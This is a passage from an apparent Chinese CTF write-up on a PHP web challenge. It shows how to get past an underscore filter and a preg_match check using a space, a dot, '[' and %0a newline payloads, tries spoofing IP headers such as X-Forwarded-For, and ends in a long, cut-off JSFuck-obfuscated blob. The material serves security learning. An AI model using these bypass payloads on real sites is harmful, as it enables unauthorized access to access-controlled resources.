class="hljs-variable">$query</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>]; <span class="hljs-comment">//获取当前页面 URL 中问号后面的查询字符串部分</span><br><br> <span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">substr_count</span>(<span class="hljs-variable">$query</span>, <span class="hljs-string">&#x27;_&#x27;</span>) !== <span class="hljs-number">0</span> || <span class="hljs-title function_ invoke__">substr_count</span>(<span class="hljs-variable">$query</span>, <span class="hljs-string">&#x27;%5f&#x27;</span>) != <span class="hljs-number">0</span> )&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Y0u are So cutE!&#x27;</span>); <span class="hljs-comment">//不允许存在下划线或其URL编码</span><br>&#125;<br> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b_u_p_t&#x27;</span>] !== <span class="hljs-string">&#x27;23333&#x27;</span> &amp;&amp; <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^23333$/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b_u_p_t&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you are going to the next ~&quot;</span>; <span class="hljs-comment">//GET传参b_u_p_t,不若等于23333且必须严格匹配23333才返回true，^表示开始%$表示结束</span><br>&#125;<br>!--&gt;<br></code></pre></td></tr></table></figure><p>条件一和条件二是矛盾的，不过由于<code>PHP</code>这种伟大的语言存在肯定变得不矛盾了。网上搜了下<code>substr_count</code>绕过结果直接把<code>wp</code>搜出来了。。后面想了想这个下划线的问题，之前<code>newstarctf</code>做过一道类似的，可以通过一些非法字符去替换这个下划线<code>(https://www.freebuf.com/articles/web/213359.html)</code></p><p>绕过这个<code>_</code>主要有三种方法：</p><p>1.利用空格。</p><p>2.利用小数点。</p><p>3.利用<code>[</code>（注意这个只能利用一次，当PHP版本小于8时，中括号会被转换成下划线<code>_</code>，但是会出现转换错误导致接下来如果该参数名中还有<code>非法字符</code>并不会继续转换成下划线<code>_</code>）</p><p><code>/?b u p t </code>或<code>/?b.u.p.t</code></p><p>接下来就是正则匹配的绕过，<code>0xGame</code>做过类似的，<code>preg_match</code>这东西只会匹配第一行，所以可以用<code>%0a</code>绕过。(<code>参考：https://www.cnblogs.com/iwantflag/p/15262445.html</code>)</p><p>综上我们可以令<code>/?b u p t=23333%0a</code>：</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs inform7">how smart you <span class="hljs-keyword">are</span> ~<br><br>FLAG <span class="hljs-keyword">is</span> in secrettw.php<br></code></pre></td></tr></table></figure><p>访问<code>secrettw.php</code>:</p><p><img src="/img/taowa1.png" alt="taowa1"></p><p>提示只有本地才能访问，抓包加个头<code>X-Forwarded-For:127.0.0.1</code>，不过没成功？后面又尝试<code>X-Real-IP/Client-IP</code>都没成功。。右键看源码发现这么个东西：</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs inform7">&lt;!--<br><span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span><span class="hljs-comment">[(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>]</span>((!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(+<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(+(!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>))<span class="hljs-comment">[(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>]</span><span class="hljs-comment">[(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+((+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>]</span>(!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>)+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>)()((!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+(<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span 